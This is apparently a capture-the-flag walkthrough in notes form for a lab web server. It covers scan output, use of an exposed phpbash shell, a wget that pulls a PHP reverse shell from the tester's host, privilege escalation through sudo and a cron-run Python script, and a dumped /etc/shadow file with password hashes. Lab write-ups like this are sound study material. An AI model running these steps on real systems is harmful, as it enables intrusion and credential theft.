@@ -1,0 +1,89 @@
+10.10.10.68
+
+
+Nmap
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+
+
+
+Nikto
+Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ /config.php: PHP Config file may contain database IDs and passwords...
++ OSVDB-3268: /dev/: Directory indexing found.
++ OSVDB-3092: /dev/: This might be interesting...
++ OSVDB-3268: /php/: Directory indexing found.
++ OSVDB-3092: /php/: This might be interesting...
+
+
+
+Webpage
+http://10.10.10.68/dev/phpbash.php
+
+interactive phpbash shell
+
+ls command lists an uploads folder
+upload a php reverse shell
+
+Wget http://10.10.14.6:8000/rs.php
+
+setup netcat listerner
+
+Call the reverse shell from the web browser /uploads/rs.php
+
+whoami
+www-data
+
+cat user.txt
+
+
+sudo -l
+
+sudo -u scriptmanager /bin/bash
+
+scriptmanager
+
+/scripts/
+
+update the test.py file with a one liner python reverse shell doenst work
+
+uploaded test.py
+
+
+# cat root.txt
+
+
+
+
+# cat /etc/shadow
+root:!:17504:0:99999:7:::
+daemon:*:17212:0:99999:7:::
+bin:*:17212:0:99999:7:::
+sys:*:17212:0:99999:7:::
+sync:*:17212:0:99999:7:::
+games:*:17212:0:99999:7:::
+man:*:17212:0:99999:7:::
+lp:*:17212:0:99999:7:::
+mail:*:17212:0:99999:7:::
+news:*:17212:0:99999:7:::
+uucp:*:17212:0:99999:7:::
+proxy:*:17212:0:99999:7:::
+www-data:*:17212:0:99999:7:::
+backup:*:17212:0:99999:7:::
+list:*:17212:0:99999:7:::
+irc:*:17212:0:99999:7:::
+gnats:*:17212:0:99999:7:::
+nobody:*:17212:0:99999:7:::
+systemd-timesync:*:17212:0:99999:7:::
+systemd-network:*:17212:0:99999:7:::
+systemd-resolve:*:17212:0:99999:7:::
+systemd-bus-proxy:*:17212:0:99999:7:::
+syslog:*:17212:0:99999:7:::
+_apt:*:17212:0:99999:7:::
+messagebus:*:17504:0:99999:7:::
+uuidd:*:17504:0:99999:7:::
+arrexel:$1$mDpVXKQV$o6HkBjhl/e.S.bV96tMm6.:17504:0:99999:7:::
+scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk35Nqd0:17504:0:99999:7:::
